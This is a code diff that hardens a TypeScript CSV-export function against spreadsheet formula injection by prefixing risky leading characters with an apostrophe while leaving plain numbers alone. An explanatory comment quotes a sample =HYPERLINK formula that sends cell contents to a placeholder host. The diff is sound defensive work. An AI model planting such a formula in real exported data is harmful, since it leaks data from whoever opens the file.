@@ -27,13 +27,42 @@
  */
 export function csvField(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const s = value instanceof Date ? value.toISOString() : String(value);
-  if (s === '') return '';
+  const raw = value instanceof Date ? value.toISOString() : String(value);
+  if (raw === '') return '';
+
+  /*
+   * Formula injection, found 2026-09-01.
+   *
+   * The quoting below makes the file PARSE correctly. It does nothing about
+   * Excel and Sheets treating any cell that opens with = + - @ tab or CR as
+   * a formula to execute. Nearly every column in these exports is free text
+   * somebody outside the company typed: a company name, a customer name, an
+   * address, a support subject. A business that names itself
+   * =HYPERLINK("http://x/?d="&A1,"Invoice") gets that formula run by
+   * whichever member of ops opens the export, in their session, on their
+   * machine.
+   *
+   * A leading apostrophe is the standard neutraliser: both Excel and Sheets
+   * read the remainder as literal text and do not show the quote.
+   *
+   * Numbers are exempt on purpose. Every money column can legitimately be
+   * negative, and prefixing -1500.00 would turn an amount into text and
+   * break the operator's totals. The rule is that the maths has to
+   * reconcile, so a plain number is left exactly as it is.
+   */
+  const s = FORMULA_LEAD.test(raw) && !PLAIN_NUMBER.test(raw) ? `'${raw}` : raw;
+
   if (/[",\r\n]/.test(s) || s !== s.trim()) {
     return '"' + s.replace(/"/g, '""') + '"';
   }
   return s;
 }
+
+/** Characters a spreadsheet reads as "this cell is a formula". */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** Left alone: a real number, including a negative amount. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
 
 /** One CSV record, CRLF-terminated as RFC 4180 specifies. */
 export function csvRow(values: unknown[]): string {
